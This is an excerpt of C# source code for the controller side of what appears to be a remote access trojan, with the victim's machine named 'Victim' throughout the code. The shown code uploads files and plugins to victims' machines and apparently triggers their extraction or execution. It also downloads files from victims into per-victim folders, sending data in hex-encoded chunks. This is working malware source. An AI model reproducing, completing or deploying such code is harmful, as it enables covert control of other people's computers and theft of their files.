...
namespace Reception
{
    public partial class Form1 : Form
    {
        ...
        Dictionary<Victim, Dictionary<string, UDF_Code>> Upload_Status = new Dictionary<Victim, Dictionary<string, UDF_Code>>();
        Dictionary<Victim, Dictionary<string, int[]>> Upload_CheckCount = new Dictionary<Victim, Dictionary<string, int[]>>();
            ...
            try
            {
                ...
                else if (type == "File")
                {
                    ...
                    else if (command == "uf") //UPLOAD FILE
                    {
                        ...
                        string status = _split[4];
                        string err_msg = _split[5];

                        Upload_CheckCount[v][path][1]++; //UPDATE RECEIVED COUNT

                        //f_ft.UpdateProgress(path);

                        if (status == "0")
                        {
                            Upload_Status[v][path] = UDF_Code.Stop;
                        }
                        else if (status == "1")
                        {
                            if (op_code == "0")
                            {
                                int sent = Upload_CheckCount[v][path][0];
                                int received = Upload_CheckCount[v][path][1];
                                if (Upload_Status[v][path] == UDF_Code.Done && sent == received) //FINISHED
                                {
                                    Upload_Status[v].Remove(path);
                                    Upload_CheckCount[v].Remove(path);

                                    if (Upload_Status[v].Count == 0 && Upload_CheckCount[v].Count == 0)
                                    {
                                        Upload_Status.Remove(v);
                                        Upload_CheckCount.Remove(v);

                                        try { FileListViewRefresh(); } catch { }
                                    }
                                }
                            }
                            else if (op_code == "1")
                            {
                                string e2 = Path.Combine(Path.GetDirectoryName(path), Path.GetFileNameWithoutExtension(path));
                                v.RunPayload("File", v, new string[] { "af_e", "1", path, e2 });
                            }
                        }
                    }
                    ...
                    {
                        string path = _split[2];
                        string code = _split[3];
                        string hex_content = _split[4];
                        string save_path = Path.Combine(Application.StartupPath, "Victim", v.ID, "Downloads", Path.GetFileName(path));

                        if (code == "0") //NOT LAST -> VALID CONTENT BUFFER
                        {
                            byte[] content = Convert.FromHexString(hex_content);
                            if (!df_offset.ContainsKey(v))
                                df_offset.Add(v, 0);

                            try
                            {
                                using (FileStream fs = new FileStream(save_path, FileMode.Append))
                                {
                                    fs.Write(content, 0, content.Length);
                                    df_offset[v] += content.Length;
                                }
                                v.RunPayload("File", v, new string[] { "df", path, df_offset[v].ToString() });
                            }
                            catch (Exception ex)
                            {
                        ...
                        else if (code == "1") //NO MORE CONTENT BUFFER.
                        {
                            df_offset[v] = 0;
                            Download_Status[v] = UDF_Code.Next; //THIS DOWNLOAD IS FINISHED, NEXT FILE.
                        }
                    }
        ...
        //DISCONNECT EVENT
        void Disconnect(Listener l, Victim v)
        {
        ...
        void uf_SendChunk(object obj)
        {
            object[] objs = (object[])obj;
            string local_file = (string)objs[1];
            Victim v = (Victim)objs[0];
            string current_dir = (string)objs[2];
            string op_code = (string)objs[3];

            string remote_file = Path.Combine(current_dir, Path.GetFileName(local_file));

            try
            {
                if (!Upload_Status.ContainsKey(v))
                    Upload_Status[v] = new Dictionary<string, UDF_Code> { { remote_file, UDF_Code.Next } };

                if (!Upload_CheckCount.ContainsKey(v))
                    Upload_CheckCount[v] = new Dictionary<string, int[]> { { remote_file, new int[] { 0, 0 } } }; //FIRST INDEX : SENT, SECOND INDEX : RECEIVED

                if (!Upload_Status[v].ContainsKey(remote_file))
                    Upload_Status[v][remote_file] = UDF_Code.Next;

                if (!Upload_CheckCount[v].ContainsKey(remote_file))
                    Upload_CheckCount[v][remote_file] = new int[] { 0, 0 };

                using (FileStream fs = File.OpenRead(local_file))
                {
                    int hex;
                    StringBuilder sb = new StringBuilder();

                    UDF_Code code = UDF_Code.Next;
                    try { code = Upload_Status[v][remote_file]; } catch { }

                    for (int i = 0; (hex = fs.ReadByte()) != -1; i++)
                    {
                        code = UDF_Code.Next;
                        try { code = Upload_Status[v][remote_file]; } catch { Upload_Status[v][remote_file] = code; };
                        sb.Append(string.Format("{0:X2}", hex));
                        if (i % chunk_length == 0 && i > 0)
                        {
                            Upload_CheckCount[v][remote_file][0]++;
                            v.RunPayload("File", v, new string[] //SEND FILE CHUNK
                            {
                                "uf", //COMMAND.
                                op_code, //OPERATION CODE
                                remote_file, //REMOTE FILE PATH.
                                sb.ToString() //FILE BYTE IN HEX FORMAT.
                            });
                            code = UDF_Code.Wait; //AFTER SEND CHUNK, TO PREVENT PACKET STICKED, IT WAIT UNTILE RECEIVE RESPONSE FROM VICTIM.
                            sb.Clear();
                        }
                        while (code == UDF_Code.Wait && code != UDF_Code.Stop)
                        {
                            code = Upload_Status[v][remote_file]; //UPDATE CURRENT STATUS CODE
                            Thread.Sleep(100);
                        }

                        if (code == UDF_Code.Stop)
                        {
                            MessageBox.Show("ERROR");
                            break;
                        }
                    }
                    if (sb.Length > 0 && code != UDF_Code.Stop)
                    {
                        Upload_CheckCount[v][remote_file][0]++;
                        v.RunPayload("File", v, new string[] //SEND FILE CHUNK
                        {
                    ...
                    Upload_Status[v][remote_file] = UDF_Code.Done;
                }
            }
            catch (Exception ex)
            {
                //Upload_Status[v].Remove(remote_file);
                //Upload_CheckCount[v].Remove(remote_file);
            }
        }
        void UploadFile_Thread(object obj)
        {
            object[] objs = (object[])obj;
            Victim v = (Victim)objs[0];
            List<string> local_files = (List<string>)objs[1]; //FILE FOR UPLOADS
            string current_dir = (string)objs[2]; //REMOTE DIR
            string op_code = (string)objs[3]; //OPERATION CODE

            if (v == null || local_files == null || current_dir == null) return;

            if (local_files.Count == 0) return;

            Dictionary<string, int> status = new Dictionary<string, int>();

            //LOAD UPLOAD STATUS LISTVIEW
            for (int j = 0; j < local_files.Count; j++)
            {
                string local_file = local_files[j];
                string remote_path = Path.Combine(current_dir, Path.GetFileName(local_file));
                using (FileStream fs = File.OpenRead(local_file))
                {
                    int times = 0;
                    bool cut = false;
                    for (int i = 0; fs.ReadByte() != -1; i++)
                    {
                        if (i % chunk_length == 0)
                        {
                            times++;
                    ...
                    status[remote_path] = times;
                }
            }

            //f_ft.status = status;

            foreach (string local_file in local_files)
            {
                new Thread(new ParameterizedThreadStart(uf_SendChunk)).Start(new object[]
                {
                    v, //VICTIM
        ...
        void UploadFile()
        {
            ...
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                ...
                Victim v = (Victim)((object[])page.Tag)[0];
                Upload_Status.Add(v, new Dictionary<string, UDF_Code>()); //ADD NEW TASK
                //Upload_Node.Add(v, node);
                new Thread(new ParameterizedThreadStart(UploadFile_Thread)).Start(new object[]
                {
                    v, //Victim
                    ofd.FileNames.ToList(), //LOCAL FILES
                    lv.Tag.ToString(), //CURRENT DIR.
                });
            }
        ...
        void rPlugin_Load()
        {
            ...
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                ...
                object[] objs =
                {
                    v, //VICTIM
                    files, //LOCAL FILES
                    _var.t.Text, //TEMP DIR
                    "1", //OPERATION CODE
                };

                new Thread(new ParameterizedThreadStart(UploadFile_Thread)).Start(objs);
            }
        }
        void rPlugin_Remove()
        {
        ...
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            ...
            {
                if (server.is_listen) server.Stop();
